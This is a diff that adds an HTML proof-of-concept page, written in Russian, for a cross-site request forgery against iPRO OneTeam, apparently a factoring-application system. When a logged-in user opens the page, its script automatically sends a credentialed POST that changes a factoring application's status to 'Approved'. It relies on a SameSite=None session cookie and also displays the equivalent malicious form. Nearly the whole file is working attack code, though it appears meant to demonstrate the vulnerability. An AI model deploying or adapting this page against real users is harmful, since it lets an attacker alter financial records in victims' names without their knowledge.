@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CSRF PoC — Факторинг</title>
+    <style>
+      body {
+        font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
+        max-width: 680px;
+        margin: 40px auto;
+        padding: 0 16px;
+        line-height: 1.5;
+      }
+      code, pre {
+        background: #0d1117;
+        color: #e6edf3;
+        border-radius: 6px;
+      }
+      code { padding: 2px 6px; }
+      pre { padding: 12px; overflow-x: auto; }
+      .ok { color: #237804; font-weight: 600; }
+      .err { color: #a8071a; font-weight: 600; }
+      h1 { font-size: 22px; }
+    </style>
+  </head>
+  <body>
+    <h1>🎯 CSRF Proof-of-Concept — «сайт атакующего»</h1>
+    <p>
+      Открытие этой страницы пользователем, залогиненным в iPRO OneTeam,
+      отправляет <b>POST на изменение статуса факторинг-заявки</b> — без CSRF-токена
+      и без ведома пользователя. Кука <code>session-id</code> уходит автоматически
+      (она SameSite=None).
+    </p>
+    <p id="target"></p>
+    <p>Эквивалент вредоносной формы:</p>
+    <pre id="formSrc"></pre>
+    <p id="status"></p>
+
+    <script>
+      var p = new URLSearchParams(location.search);
+      var uuid = p.get('uuid') || '';
+      var status = p.get('status') || 'Одобрена';
+      var base =
+        p.get('base') ||
+        (location.protocol.indexOf('http') === 0
+          ? location.origin
+          : 'http://localhost:3000');
+
+      var action = base + '/api/job/' + encodeURIComponent(uuid);
+      document.getElementById('target').innerHTML =
+        'Цель: <code>' + action + '</code> → статус «' + status + '»';
+      document.getElementById('formSrc').textContent =
+        '<form action="' +
+        action +
+        '" method="POST">\n' +
+        '  <input name="status" value="' +
+        status +
+        '">\n' +
+        '</form>';
+
+      var statusEl = document.getElementById('status');
+      if (!uuid) {
+        statusEl.textContent = 'Укажите ?uuid=... в адресе страницы.';
+      } else {
+        // Авто-отправка «в фоне», чтобы страница не уходила и был виден эффект.
+        fetch(action, {
+          method: 'POST',
+          mode: 'no-cors',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'status=' + encodeURIComponent(status),
+        })
+          .then(function () {
+            statusEl.innerHTML =
+              '<span class="ok">✅ Запрос отправлен.</span> Обновите страницу заявки — статус изменился.';
+          })
+          .catch(function (e) {
+            statusEl.innerHTML = '<span class="err">Ошибка: ' + e + '</span>';
+          });
+      }
+    </script>
+  </body>
+</html>
